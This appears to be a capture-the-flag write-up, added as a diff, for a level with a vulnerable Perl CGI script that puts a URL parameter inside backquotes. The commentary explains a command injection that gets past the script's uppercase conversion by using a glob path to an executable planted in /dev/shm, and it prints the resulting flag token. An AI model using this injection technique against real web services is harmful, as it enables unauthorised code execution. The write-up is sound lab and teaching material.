@@ -1,0 +1,44 @@
+$> cat level12.pl
+#!/usr/bin/env perl
+# localhost:4646
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+
+sub t {
+  $nn = $_[1];
+  $xx = $_[0];
+  $xx =~ tr/a-z/A-Z/;
+  $xx =~ s/\s.*//;
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  foreach $line (@output) {
+      ($f, $s) = split(/:/, $line);
+      if($s =~ $nn) {
+          return 1;
+      }
+  }
+  return 0;
+}
+
+sub n {
+  if($_[0] == 1) {
+      print("..");
+  } else {
+      print(".");
+  }
+}
+
+n(t(param("x"), param("y")));
+$> # As we can see the program use backquote to evaluate a shellscript
+$> # We can exploit that by making it evaluate our script
+$> # The regex will transform the x argument to MAJ then delete anything after a space
+$> # Because Linux is case sensitive we cant directly write x="`getflag>/tmp/token`" ...
+$> # ... which will be translated as x="`GETFLAG>/TMP/TOKEN`"
+$> # Instead we will write a file that will be executed
+$> cat /dev/shm/EXPLOIT
+#!/bin/sh
+getflag > /tmp/token
+$> chmod +x /dev/shm/EXPLOIT
+$> # We use globbing to write path (see above why)
+$> # URL: http://<host>:4646/?x="`/*/*/EXPLOIT`"
+$> cat /tmp/token
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
